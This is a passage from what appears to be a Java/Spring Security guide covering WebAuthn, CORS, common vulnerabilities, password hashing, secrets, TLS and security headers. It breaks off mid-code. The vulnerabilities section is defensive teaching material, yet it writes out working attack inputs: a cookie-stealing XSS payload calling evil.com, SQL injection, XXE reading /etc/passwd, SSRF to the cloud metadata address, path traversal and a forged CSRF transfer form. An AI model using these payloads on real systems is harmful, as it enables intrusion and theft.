2. Browser asks authenticator to sign the challenge with the matching private key
3. Server verifies the signature against the stored public key, checks counter monotonically increased

### Spring Security WebAuthn DSL (6.5+)

Spring Security 6.5 shipped a first-class `webAuthn()` configurer. Minimum wiring:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
        .formLogin(Customizer.withDefaults())
        .webAuthn(webAuthn -> webAuthn
            .rpName("My App")
            .rpId("example.com")                  // must match eTLD+1 of the site
            .allowedOrigins("https://example.com"))
        .build();
}

// Custom credential repository (default is in-memory; override for production)
@Bean
public UserCredentialRepository userCredentialRepository(
        PublicKeyCredentialRepository repo) {
    return new JpaUserCredentialRepository(repo); // your JPA impl
}
```

Spring 6.5 also added an optional `messageConverter` property on the `webAuthn` DSL for custom JSON serialization and a pluggable `PublicKeyCredentialCreationOptionsRepository` for storing registration state across nodes (use Redis in a clustered environment).

### Attestation: When to Verify, When to Skip

Attestation lets the server cryptographically verify *what kind* of authenticator enrolled. Three modes:

| Mode | Use case |
|------|----------|
| `none` | Consumer apps — accept any authenticator, trust the browser's UV flag |
| `indirect` | Platform decides (server may get a redacted attestation) |
| `direct` | Enterprise / regulated — verify against the FIDO Metadata Service (MDS) to allow only approved YubiKey models, etc. |

Use `none` for most consumer SaaS. Use `direct` + FIDO MDS for compliance-bound environments (healthcare, finance).

### Passkey vs Hardware Token Trade-offs

| Authenticator | Phishing-resistant | Hardware-bound | Portable | Best for |
|---------------|--------------------|----------------|----------|----------|
| **Synced passkey** (iCloud, Google) | Yes | No (synced) | Yes (same ecosystem) | Consumers, SaaS |
| **Device-bound passkey** (TPM, Secure Enclave) | Yes | Yes | No | Employee laptops |
| **Roaming authenticator** (YubiKey) | Yes | Yes | Yes (physical) | Admins, high-value accounts |
| **TOTP (Google Authenticator)** | No (phishable) | No | Yes | Legacy 2FA — being phased out |
| **SMS OTP** | No (SIM swap, phishable) | No | Yes | Deprecated by NIST SP 800-63B rev 4 |

---

## 6. CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

Browsers enforce the **same-origin policy**: scripts on `https://app.example.com` cannot make requests to `https://api.other.com` by default. Two URLs have the same origin if they share the same **scheme**, **host**, and **port**.

```
https://example.com:443/path   — origin: https://example.com:443

Same origin:    https://example.com/other-path
Different origin: http://example.com     (different scheme)
Different origin: https://api.example.com (different host)
Different origin: https://example.com:8080 (different port)
```

### Simple Requests vs Preflight Requests

**Simple requests** (no preflight needed):
- Method: `GET`, `HEAD`, or `POST`
- Only safe headers: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` (only `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`)

**Preflight requests** (browser sends `OPTIONS` first):
- Any other HTTP method (`PUT`, `DELETE`, `PATCH`)
- Custom headers (e.g., `Authorization`, `X-Request-ID`)
- `Content-Type: application/json`

```
Preflight flow:

1. Browser sends OPTIONS request:
   OPTIONS /api/users
   Origin: https://app.example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Authorization, Content-Type

2. Server responds:
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Authorization, Content-Type
   Access-Control-Max-Age: 3600

3. If allowed, browser sends actual PUT request
```

### CORS Response Headers

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Allowed origin(s) — specific origin or `*` (no credentials with `*`) |
| `Access-Control-Allow-Methods` | Allowed HTTP methods |
| `Access-Control-Allow-Headers` | Allowed request headers |
| `Access-Control-Allow-Credentials` | Whether cookies/auth headers are allowed (`true`/omit) |
| `Access-Control-Expose-Headers` | Response headers the browser can access via JS |
| `Access-Control-Max-Age` | Seconds the preflight result can be cached |

### Spring CORS Configuration

**Option 1: `@CrossOrigin` annotation (per controller/method)**

```java
@RestController
@CrossOrigin(origins = "https://app.example.com", maxAge = 3600)
public class UserController {

    @CrossOrigin(origins = {"https://app.example.com", "https://admin.example.com"})
    @GetMapping("/api/users")
    public List<User> getUsers() { ... }
}
```

**Option 2: Global configuration via `WebMvcConfigurer`**

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

**Option 3: `CorsFilter` bean (works with Spring Security)**

```java
@Bean
public CorsFilter corsFilter() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return new CorsFilter(source);
}
```

**Integration with Spring Security** — CORS must be configured in the security filter chain too, or preflight `OPTIONS` requests will be blocked before reaching your CORS config:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .csrf(csrf -> csrf.disable())
        // ... other security config
        .build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

### Common CORS Mistakes

1. **Using `Access-Control-Allow-Origin: *` with credentials** — browsers reject this combination. You must specify the exact origin.
2. **Not handling `OPTIONS` preflight** — if Spring Security blocks OPTIONS requests, CORS fails silently.
3. **Configuring CORS only in Spring MVC, not in Spring Security** — the security filter chain runs first and may reject the request before CORS headers are added.
4. **Wildcard in `allowedOrigins` with `allowCredentials(true)`** — use `allowedOriginPatterns` instead if you need patterns with credentials.
5. **Forgetting `Access-Control-Expose-Headers`** — custom response headers are hidden from JavaScript unless explicitly exposed.

---

## 7. Common Java Security Vulnerabilities

### SQL Injection

Untrusted input is concatenated into SQL queries, allowing attackers to manipulate the query logic.

**Vulnerable:**
```java
// NEVER do this — direct string concatenation
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    // Input: ' OR '1'='1' --
    // Becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return jdbcTemplate.queryForObject(sql, userRowMapper);
}
```

**Secure:**
```java
// Parameterized query — JDBC
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(sql, userRowMapper, username);
}

// Named parameters — Spring
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = :username";
    MapSqlParameterSource params = new MapSqlParameterSource("username", username);
    return namedJdbcTemplate.queryForObject(sql, params, userRowMapper);
}

// JPA/Hibernate — parameterized by default
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

### XSS (Cross-Site Scripting)

Attacker injects malicious JavaScript that runs in other users' browsers.

**Vulnerable:**
```java
// Reflected XSS — user input rendered directly in HTML
@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    model.addAttribute("query", query);
    return "search"; // Thymeleaf template renders query unescaped
}
// Input: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Secure:**
```java
// Thymeleaf auto-escapes with th:text (NOT th:utext)
// In template: <span th:text="${query}"></span>  -- safe, HTML-escaped
//              <span th:utext="${query}"></span>  -- UNSAFE, renders raw HTML

// Explicit sanitization with OWASP Java HTML Sanitizer
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userInput);

// Content-Security-Policy header to prevent inline scripts
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers
            .contentSecurityPolicy(csp ->
                csp.policyDirectives("default-src 'self'; script-src 'self'"))
        )
        .build();
}
```

### CSRF (Cross-Site Request Forgery)

Attacker tricks a logged-in user's browser into making unwanted requests to a site where the user is authenticated.

```html
<!-- Malicious page the victim visits -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

**Protection strategies:**

```java
// Spring Security 6 — SPA-friendly CSRF. Uses the "deferred token" pattern
// with CookieCsrfTokenRepository + CsrfTokenRequestAttributeHandler
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    CookieCsrfTokenRepository tokenRepository = CookieCsrfTokenRepository.withHttpOnlyFalse();
    CsrfTokenRequestAttributeHandler requestHandler = new CsrfTokenRequestAttributeHandler();
    // Opt out of BREACH-mitigation header renaming for SPAs that expect X-XSRF-TOKEN
    requestHandler.setCsrfRequestAttributeName(null);

    return http
        .csrf(csrf -> csrf
            .csrfTokenRepository(tokenRepository)
            .csrfTokenRequestHandler(requestHandler))
        .build();
}

// Stateless APIs using JWT in Authorization header — no cookies, no CSRF.
// (Spring Security still has CSRF enabled by default for POST/PUT/PATCH/DELETE;
// you MUST disable it explicitly for stateless APIs or all mutations return 403.)
@Bean
public SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf.disable())
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .build();
}
```

**Modern Spring Security stance on CSRF (6.x):**
- CSRF is **still enabled by default** — Spring did *not* turn it off. The 6.x changes were to the token handler (BREACH mitigation) and the deferred-token pattern.
- `CookieCsrfTokenRepository.withHttpOnlyFalse()` is the SPA pattern: server writes `XSRF-TOKEN` cookie, client JS reads it and echoes it in `X-XSRF-TOKEN` header. Because a cross-origin attacker cannot read the cookie (SameSite) or set custom headers (CORS preflight), this works.
- **Do not disable CSRF** if you use session cookies for auth, even for JSON APIs — a JSON `fetch()` from a malicious origin without preflight is no longer impossible on exotic setups.

**SameSite cookies** (modern defense):
```
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```
- `SameSite=Strict` — cookie never sent on cross-site requests (logs users out when following external links to your site)
- `SameSite=Lax` — cookie sent on top-level navigations (GET) but not POST/forms from other sites. **Browser default since 2020.**
- `SameSite=None; Secure` — always sent cross-site (opt-in, requires HTTPS). Needed for iframed SSO widgets.

Even with `SameSite=Lax`, CSRF tokens are still recommended as defense-in-depth — some browsers have relaxed the default, and not all requests are covered.

### Deserialization Attacks

Java's `ObjectInputStream` can instantiate arbitrary classes during deserialization, leading to **Remote Code Execution (RCE)**. Gadget chains in popular libraries (Apache Commons Collections, Spring AOP, Hibernate, Log4j 1.x) allow attackers to build a payload that, when deserialized, triggers `Runtime.exec`. The **canonical answer in 2026 is: do not use Java serialization for untrusted data.** Serialization filtering is a stopgap, not a fix.

**Vulnerable:**
```java
// DANGEROUS — deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject(); // Can trigger gadget chains leading to RCE
```

**Secure:**
```java
// Option 1: Allowlist with ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
        // Only allow specific safe classes
        if (clazz == MyDataClass.class || clazz == String.class) {
            return ObjectInputFilter.Status.ALLOWED;
        }
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.UNDECIDED;
});

// Option 2: Avoid Java serialization entirely — use JSON
ObjectMapper mapper = new ObjectMapper();
// Use DTOs with explicit fields, avoid polymorphic deserialization
MyDto dto = mapper.readValue(jsonString, MyDto.class);
```

### XXE (XML External Entities)

XML parsers can be tricked into loading external resources, reading local files, or performing SSRF.

**Vulnerable:**
```java
// Default XML parser may process external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(untrustedXmlInput);

// Malicious XML:
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <data>&xxe;</data>
```

**Secure:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities and DTDs
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature(
    "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);
```

### SSRF (Server-Side Request Forgery)

Attacker tricks the server into making requests to internal resources.

**Vulnerable:**
```java
// Fetches a URL provided by the user — no validation
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws IOException {
    // Attacker input: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    // Or: http://localhost:8080/admin/delete-all
    return new String(new URL(url).openStream().readAllBytes());
}
```

**Secure:**
```java
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws IOException {
    URI uri = URI.create(url);

    // Validate scheme
    if (!"https".equals(uri.getScheme())) {
        throw new SecurityException("Only HTTPS URLs allowed");
    }

    // Resolve and validate host
    InetAddress address = InetAddress.getByName(uri.getHost());
    if (address.isLoopbackAddress() || address.isSiteLocalAddress()
            || address.isLinkLocalAddress()) {
        throw new SecurityException("Internal addresses not allowed");
    }

    // Allowlist of permitted domains
    Set<String> allowedDomains = Set.of("api.trusted.com", "cdn.trusted.com");
    if (!allowedDomains.contains(uri.getHost())) {
        throw new SecurityException("Domain not in allowlist");
    }

    // Proceed with validated URL
    HttpClient client = HttpClient.newHttpClient();
    HttpRequest request = HttpRequest.newBuilder(uri).build();
    return client.send(request, HttpResponse.BodyHandlers.ofString()).body();
}
```

### Path Traversal

Attacker manipulates file paths to access files outside the intended directory.

**Vulnerable:**
```java
@GetMapping("/download")
public byte[] downloadFile(@RequestParam String filename) throws IOException {
    // Input: ../../etc/passwd
    Path path = Path.of("/app/uploads/" + filename);
    return Files.readAllBytes(path);
}
```

**Secure:**
```java
@GetMapping("/download")
public byte[] downloadFile(@RequestParam String filename) throws IOException {
    Path basePath = Path.of("/app/uploads").toRealPath();
    Path filePath = basePath.resolve(filename).normalize().toRealPath();

    // Ensure resolved path is still within the base directory
    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }

    return Files.readAllBytes(filePath);
}
```

---

## 8. Password Security

### Why Not MD5 or SHA?

MD5 and SHA-family hashes are **general-purpose hash functions** designed to be fast. This is exactly what you do NOT want for passwords — attackers can compute billions of MD5 hashes per second with modern GPUs.

**Password hashing functions** are intentionally slow and include a configurable **cost factor** that can be increased as hardware gets faster.

### Recommended Algorithms

| Algorithm | Mechanism | Memory-Hard | Notes |
|-----------|-----------|-------------|-------|
| **Argon2id** | Winner of Password Hashing Competition (2015), RFC 9106 | Yes | **Current OWASP #1 recommendation.** Hybrid of Argon2i and Argon2d — resists GPU/ASIC and side-channel. Now a first-class algorithm in the JDK 24+ KDF API (JEP 478). |
| **scrypt** | Sequential memory-hard | Yes | Good fallback where Argon2 unavailable. Resistant to GPU/ASIC. |
| **bcrypt** | Blowfish-based, 128-bit salt | No | Still widely deployed, still acceptable at cost ≥ 12. Maximum password length of 72 bytes is a footgun — either reject longer passwords or pre-hash with SHA-256 before bcrypt. |
| **PBKDF2-HMAC-SHA256** | Iterated HMAC | No | FIPS-approved; use only when compliance requires it (600,000+ iterations in 2025 per NIST SP 800-63B revision 4). Not memory-hard — weak against GPU attacks. |
| MD5, SHA-1, SHA-256/512 (raw) | Fast general-purpose hash | No | **Never for passwords.** Even salted, brute-forceable at 10+ billion hashes/sec on a consumer GPU. |

### OWASP 2026 Parameter Guidance

- **Argon2id**: m=19 MiB, t=2, p=1 (minimum) — raise to m=64 MiB where latency budget allows
- **scrypt**: N=2^17, r=8, p=1
- **bcrypt**: cost ≥ 12
- **PBKDF2-HMAC-SHA256**: ≥ 600,000 iterations

### How Salting Works

A **salt** is a random value unique to each password hash. It prevents:
- **Rainbow table attacks** — precomputed hash tables become useless
- **Identical password detection** — same password produces different hashes

```
password + "randomsalt123" -> BCrypt -> $2a$12$randomsalt123hashedresult...
password + "othersaltXYZ"  -> BCrypt -> $2a$12$othersaltXYZdifferentresult...
```

BCrypt, SCrypt, and Argon2 all generate and embed the salt automatically in the output string.

### Work Factor Tuning

The work factor (cost parameter) controls how much computation is needed per hash. It should be tuned so that hashing takes approximately **100ms-500ms** on your production hardware.

```
BCrypt cost factor: 2^cost iterations
  Cost 10: ~100ms (minimum recommended)
  Cost 12: ~300ms (good default)
  Cost 14: ~1200ms (high security)
```

### Spring Security PasswordEncoder

The idiomatic 2026 setup uses **`DelegatingPasswordEncoder` with Argon2id as the default** — this lets you upgrade algorithms over time while still verifying legacy hashes. New hashes are prefixed with `{argon2}`; old `{bcrypt}` or `{pbkdf2}` hashes still validate, and `upgradeEncoding()` transparently rehashes on successful login.

```java
@Configuration
public class PasswordConfig {

    // Preferred — delegating encoder with Argon2id default
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Use the Spring-provided factory; it uses modern OWASP parameters.
        return PasswordEncoderFactories.createDelegatingPasswordEncoder();
        // Stored format: {argon2@SpringSecurity_v5_8}$argon2id$v=19$m=16384,t=2,p=1$...
    }

    // Explicit Argon2id — tune m/t/p to your hardware (target 100-500ms per hash)
    @Bean
    public PasswordEncoder explicitArgon2() {
        return Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
        // saltLength=16, hashLength=32, parallelism=1, memory=16384 KiB, iterations=2
    }

    // Custom mix with legacy support
    @Bean
    public PasswordEncoder migrationEncoder() {
        String defaultId = "argon2";
        Map<String, PasswordEncoder> encoders = Map.of(
            "argon2", Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8(),
            "bcrypt", new BCryptPasswordEncoder(12),
            "scrypt", SCryptPasswordEncoder.defaultsForSpringSecurity_v5_8(),
            "pbkdf2", Pbkdf2PasswordEncoder.defaultsForSpringSecurity_v5_8(),
            "noop",   NoOpPasswordEncoder.getInstance() // only for test migrations
        );
        return new DelegatingPasswordEncoder(defaultId, encoders);
    }
}
```

### KDF API (JEP 478, JDK 24+)

Java 24 introduced `javax.crypto.KDF` — a first-class API for **Key Derivation Functions** (HKDF today, Argon2 and scrypt added via finalization in JEP 510). This is separate from password hashing (use `PasswordEncoder`) — it is for deriving cryptographic keys from passwords, shared secrets, or other high-entropy material. The API is a building block for Hybrid Public Key Encryption (HPKE) and post-quantum key agreement.

```java
// Derive a session key from an ECDH shared secret using HKDF-SHA256 (JEP 478)
KDF hkdf = KDF.getInstance("HKDF-SHA256");
AlgorithmParameterSpec params = HKDFParameterSpec.ofExtract()
    .addIKM(sharedSecret)        // input keying material
    .addSalt(salt)
    .thenExpand(info, 32);       // info context + 32-byte output
SecretKey sessionKey = hkdf.deriveKey("AES", params);
```

### BCrypt Usage Example

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordExample {

    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);

    public String hashPassword(String rawPassword) {
        // Generates salt automatically, includes it in output
        return encoder.encode(rawPassword);
        // Output: $2a$12$WApznUPhDubN0oeveSXHpOQJMCKZJuTsTpOI5JXRWO/mPCH3bEfSC
        //          ^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        //          cost       salt (22 chars)         hash (31 chars)
    }

    public boolean verifyPassword(String rawPassword, String storedHash) {
        // Extracts salt from stored hash, re-hashes, compares
        return encoder.matches(rawPassword, storedHash);
    }
}
```

---

## 9. Secrets Management

### Why Secrets Should Not Be in Code or Config Files

- Secrets in source code get committed to version control and are visible to everyone with repo access
- Config files (`application.properties`) are often deployed alongside the application and may be readable
- Secrets in Docker images persist in layer history even if removed later
- Once a secret is in git history, it is effectively public (even after removal from HEAD)

### HashiCorp Vault

Vault provides centralized secrets management with features like:
- **Dynamic secrets** — generates credentials on-demand (e.g., temporary database passwords) that are automatically revoked
- **Lease renewal** — secrets have a TTL and can be renewed or revoked
- **Encryption as a service** — transit engine encrypts/decrypts data without exposing keys
- **Audit logging** — every secret access is logged

```yaml
# Spring Cloud Vault integration — application.yml
spring:
  cloud:
    vault:
      uri: https://vault.example.com
      authentication: APPROLE
      app-role:
        role-id: ${VAULT_ROLE_ID}
        secret-id: ${VAULT_SECRET_ID}
      kv:
        backend: secret
        default-context: my-application
```

```java
// Secrets are injected as properties
@Value("${database.password}")
private String dbPassword; // Loaded from Vault, not application.properties
```

### AWS Secrets Manager / Parameter Store

| Feature | Secrets Manager | Parameter Store |
|---------|----------------|-----------------|
| Cost | ~$0.40/secret/month | Free tier available |
| Rotation | Built-in automatic rotation | Manual |
| Encryption | Always encrypted (KMS) | Optional encryption |
| Cross-account | Supported | Limited |
| Best for | Database creds, API keys | Configuration values, feature flags |

### Spring Cloud Config with Encryption

```yaml
# Encrypted values in config
spring:
  datasource:
    password: '{cipher}AQA1234encrypted5678...'

# Config server decrypts at serving time using a symmetric or asymmetric key
encrypt:
  key: ${ENCRYPT_KEY}  # Symmetric key from environment
```

### Environment Variables

Better than files in code but still imperfect:
- Visible in process listings (`/proc/<pid>/environ` on Linux)
- Inherited by child processes
- May be logged by accident in crash dumps or debugging output
- Cannot be rotated without restarting the process

### 12-Factor App Approach

The 12-factor methodology says: **store config in the environment**. While environment variables are the minimum bar, production systems should use a proper secrets manager:

1. **Development** — `.env` files (never committed, in `.gitignore`)
2. **CI/CD** — pipeline secrets (GitHub Actions secrets, GitLab CI variables)
3. **Production** — Vault, AWS Secrets Manager, or cloud-native solutions

---

## 10. HTTPS / TLS

### TLS Handshake (TLS 1.3 simplified)

```
Client                                Server
  |                                      |
  |  1. ClientHello                      |
  |     (supported cipher suites,        |
  |      key share, TLS version)         |
  |------------------------------------->|
  |                                      |
  |  2. ServerHello                      |
  |     (selected cipher suite,          |
  |      key share, certificate)         |
  |<-------------------------------------|
  |                                      |
  |  [Both derive session keys from      |
  |   key shares via ECDHE]              |
  |                                      |
  |  3. Client Finished (encrypted)      |
  |------------------------------------->|
  |                                      |
  |  4. Application Data (encrypted)     |
  |<------------------------------------>|
```

TLS 1.3 completes in **1 round trip** (1-RTT), compared to TLS 1.2 which required 2 round trips.

### Certificate Chains

```
Root CA (self-signed, trusted by OS/browser)
  +-- Intermediate CA (signed by Root)
       +-- Leaf Certificate (signed by Intermediate, your domain)
```

- **Root CAs** are pre-installed in OS/browser trust stores
- **Intermediate CAs** add a layer of security — if compromised, only the intermediate is revoked
- **Leaf certificates** are what your server presents; they must chain back to a trusted root

### Mutual TLS (mTLS)

Standard TLS only authenticates the server. **mTLS** also authenticates the client using a client certificate.

```
Use cases:
- Service-to-service communication in microservices
- Zero-trust networks
- API authentication (alternative to API keys)

How it works:
1. Server presents its certificate (standard TLS)
2. Server requests client certificate
3. Client presents its certificate
4. Server validates client certificate against trusted CA
5. Both parties are mutually authenticated
```

### Zero-Trust Architecture

**"Never trust, always verify"** — NIST SP 800-207. The network perimeter no longer exists; every request is authenticated and authorized on its own merits, regardless of origin. Concretely this means:

- **No implicit intranet trust** — an internal microservice call gets the same token validation as an external one
- **Short-lived credentials** — workload identities (SPIFFE SVIDs, AWS IRSA, GKE Workload Identity) rotated automatically, no long-lived service account keys
- **mTLS everywhere** — typically delivered by a service mesh (Istio, Linkerd, Consul Connect) with sidecar-terminated TLS so app code stays unchanged
- **Policy as code** — authorization decisions centralized in an engine like OPA / Cedar, pulled by each service at runtime
- **Continuous verification** — session-bound, device-posture-aware (BeyondCorp model): revoke access mid-session if risk signals change

### Java Keystores and Truststores

| Store | Contains | Purpose |
|-------|----------|---------|
| **Keystore** | Private key + certificate | Server identity (what we present) |
| **Truststore** | Trusted CA certificates | Whom we trust (validate others) |

Common `keytool` commands:

```bash
# Generate a keystore with a self-signed certificate
keytool -genkeypair -alias myserver -keyalg RSA -keysize 2048 \
  -storetype PKCS12 -keystore keystore.p12 -validity 365 \
  -storepass changeit -dname "CN=localhost"

# Import a CA certificate into a truststore
keytool -importcert -alias myca -file ca-cert.pem \
  -keystore truststore.p12 -storetype PKCS12 -storepass changeit

# List contents of a keystore
keytool -list -keystore keystore.p12 -storetype PKCS12 -storepass changeit

# Export a certificate from a keystore
keytool -exportcert -alias myserver -keystore keystore.p12 \
  -storetype PKCS12 -storepass changeit -file server-cert.pem -rfc
```

### Certificate Pinning

**Pinning** means the client hardcodes the expected server certificate (or its public key hash) instead of relying on the CA trust chain.

- **When to use**: Mobile apps communicating with your own backend; high-security internal services
- **When NOT to use**: Public websites (breaks certificate rotation), third-party APIs
- **Risk**: If the pinned certificate rotates and the app is not updated, connections fail

### Configuring TLS in Spring Boot

`application.yml`:
```yaml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    key-alias: myserver

    # For mTLS — require client certificate
    client-auth: need  # 'need' = required, 'want' = optional
    trust-store: classpath:truststore.p12
    trust-store-password: ${TRUSTSTORE_PASSWORD}
    trust-store-type: PKCS12

    # Enforce TLS 1.2+
    protocol: TLS
    enabled-protocols: TLSv1.3, TLSv1.2
```

Redirect HTTP to HTTPS:

```java
@Configuration
public class HttpsRedirectConfig {

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint constraint = new SecurityConstraint();
                constraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                constraint.addCollection(collection);
                context.addConstraint(constraint);
            }
        };
        tomcat.addAdditionalTomcatConnectors(httpConnector());
        return tomcat;
    }

    private Connector httpConnector() {
        Connector connector = new Connector(
            TomcatServletWebServerFactory.DEFAULT_PROTOCOL);
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}
```

---

## 11. Security Headers and Best Practices

### Essential Security Headers

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers
            // Prevent MIME type sniffing
            .contentTypeOptions(Customizer.withDefaults()) // X-Content-Type-Options: nosniff

            // Prevent clickjacking
            .frameOptions(frame -> frame.deny()) // X-Frame-Options: DENY

            // Force HTTPS for 1 year, include subdomains
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)) // Strict-Transport-Security

            // Content Security Policy
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data:; " +
                    "font-src 'self'; " +
                    "frame-ancestors 'none'; " +
                    "base-uri 'self'; " +
                    "form-action 'self'"))

            // Referrer Policy
            .referrerPolicy(referrer ->
                referrer.policy(
                    ReferrerPolicyHeaderWriter.ReferrerPolicy
                        .STRICT_ORIGIN_WHEN_CROSS_ORIGIN))

            // Permissions Policy (formerly Feature-Policy)
            .permissionsPolicy(permissions ->
                permissions.policy("camera=(), microphone=(), geolocation=()"))
        )
        .build();
}
```

### Security Headers Summary

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'` | Prevents XSS by controlling resource loading |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS for all future requests |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME type sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevents clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer information leakage |
| `Permissions-Policy` | `camera=(), microphone=()` | Restricts browser feature access |
| `Cache-Control` | `no-store` | Prevents caching of sensitive responses |

### Rate Limiting and API Throttling

```java
// Using Bucket4j with Spring Boot
@Component
public class RateLimitFilter extends OncePerRequestFilter {

    // Simple in-memory rate limiter (use Redis for distributed systems)
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain)
            throws ServletException, IOException {

        String clientIp = request.getRemoteAddr();
        Bucket bucket = buckets.computeIfAbsent(clientIp, k ->
            Bucket.builder()
                .addLimit(Bandwidth.classic(100,
                    Refill.intervally(100, Duration.ofMinutes(1))))
                .build()
        );

        if (bucket.tryConsume(1)) {
            chain.doFilter(request, response);
        } else {
            response.setStatus(429);
            response.setHeader("Retry-After", "60");
            response.getWriter().write("{\"error\": \"Too many requests\"}");
        }
    }
}
```

### Security Logging and Audit Trails

```java
@Component
public class SecurityAuditLogger {

    private static final Logger auditLog =
        LoggerFactory.getLogger("SECURITY_AUDIT");

    @EventListener
    public void onAuthenticationSuccess(AuthenticationSuccessEvent event) {
        String username = event.getAuthentication().getName();
        auditLog.info("LOGIN_SUCCESS user={}", username);
    }

    @EventListener
    public void onAuthenticationFailure(AbstractAuthenticationFailureEvent event) {
        String username = event.getAuthentication().getName();
        String reason = event.getException().getMessage();
        auditLog.warn("LOGIN_FAILURE user={} reason={}", username, reason);
